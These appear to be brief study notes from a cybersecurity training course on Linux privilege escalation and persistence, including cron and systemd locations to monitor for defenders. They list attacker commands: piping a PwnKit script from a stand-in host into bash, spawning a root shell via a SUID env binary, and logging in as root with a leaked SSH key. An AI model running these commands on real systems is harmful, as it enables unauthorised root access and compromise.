# Privilege Escalation
here are basics commands that uses attackers:

|Preceding Discovery (IF)|Privilege Escalation (THEN)|
|---|---|
|The `uname -a` shows an old, unpatched Ubuntu 16.04|Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash`|
|The `find /bin -perm 4000` detects an `env` binary with the SUID flag|Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`|
|The `ls /etc/ssh` exposed an unprotected `ssh-backup-key` file|Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key`|
# Persistence
## Cron
Most poplular persistence
## SystemD
Systemd is more critical system component, user must have root privileges

|                                    |                                                                             |
| ---------------------------------- | --------------------------------------------------------------------------- |
| Monitor changes in cron job files  | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |
| Monitor changes in systemd folders | `/lib/systemd/system/*`, `/etc/systemd/system/*` locations                  |
| Monitor related processes such as  | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>`      |
## Account persistence
Attacker can create new user, add new ssh key(its hard to detect due to echo >> command).
Alse there are app persistence